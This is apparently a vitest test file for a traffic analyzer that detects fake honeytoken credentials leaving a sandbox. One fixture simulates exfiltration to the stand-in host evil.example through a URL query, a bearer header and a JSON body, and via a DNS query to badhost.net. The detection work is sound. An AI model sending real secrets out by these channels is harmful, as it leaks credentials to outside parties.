import type { Honeytoken } from '@sapper-ai/types'

import { describe, expect, it } from 'vitest'

import { analyzeTraffic, TrafficAnalyzer } from '../../../openclaw/docker/TrafficAnalyzer'

function makeHoneytokens(): Honeytoken[] {
  return [
    {
      type: 'api_key',
      envVar: 'OPENAI_API_KEY',
      value: 'sk-proj-ABCDEFGH12345678ABCDEFGH12345678ABCDEFGH12345678',
      searchPattern: 'ABCD1234EFGH5678',
    },
    {
      type: 'token',
      envVar: 'GITHUB_TOKEN',
      value: 'ghp_zxcvbnmasdfghjklqwer1234tyui5678',
      searchPattern: 'QWER1234TYUI5678',
    },
    {
      type: 'password',
      envVar: 'DB_PASSWORD',
      value: 'N9!aLMNO1234PQRS5678',
      searchPattern: 'LMNO1234PQRS5678',
    },
  ]
}

describe('openclaw/docker/TrafficAnalyzer', () => {
  it('detects honeytoken exfiltration in URL, headers, body, and DNS-style lines', () => {
    const analyzer = new TrafficAnalyzer()
    const dump = `
[10:22:31.010] client connected
>> POST https://evil.example/collect?api=ABCD1234EFGH5678 HTTP/1.1
Host: evil.example
Authorization: Bearer QWER1234TYUI5678
Content-Type: application/json

{"db_password":"N9!aLMNO1234PQRS5678"}
[dns] query api.ABCD1234EFGH5678.badhost.net A
`

    const result = analyzer.analyze(dump, makeHoneytokens())

    expect(result.exfiltrationDetected).toBe(true)
    expect(result.findings.length).toBeGreaterThanOrEqual(3)
    expect(
      result.findings.some(
        (finding) =>
          finding.honeytoken.envVar === 'OPENAI_API_KEY' &&
          finding.protocol === 'https' &&
          finding.destination === 'evil.example' &&
          finding.requestPath?.startsWith('/collect') === true
      )
    ).toBe(true)
    expect(
      result.findings.some(
        (finding) =>
          finding.honeytoken.envVar === 'OPENAI_API_KEY' &&
          finding.protocol === 'dns' &&
          finding.destination === 'api.abcd1234efgh5678.badhost.net'
      )
    ).toBe(true)
    expect(result.unknownHosts).toContain('evil.example')
    expect(result.unknownHosts).toContain('api.abcd1234efgh5678.badhost.net')
  })

  it('returns no exfiltration findings when no search patterns are present', () => {
    const dump = `
<< GET https://updates.vendor.io/ping HTTP/1.1
Host: updates.vendor.io
Content-Length: 0
`
    const result = analyzeTraffic(dump, makeHoneytokens())

    expect(result.exfiltrationDetected).toBe(false)
    expect(result.findings).toHaveLength(0)
    expect(result.unknownHosts).toContain('updates.vendor.io')
  })

  it('does not flag localhost traffic as unknown', () => {
    const dump = `
>> GET http://localhost:8080/health HTTP/1.1
Host: localhost:8080
`

    const result = analyzeTraffic(dump, makeHoneytokens())

    expect(result.exfiltrationDetected).toBe(false)
    expect(result.findings).toHaveLength(0)
    expect(result.unknownHosts).toHaveLength(0)
  })
})
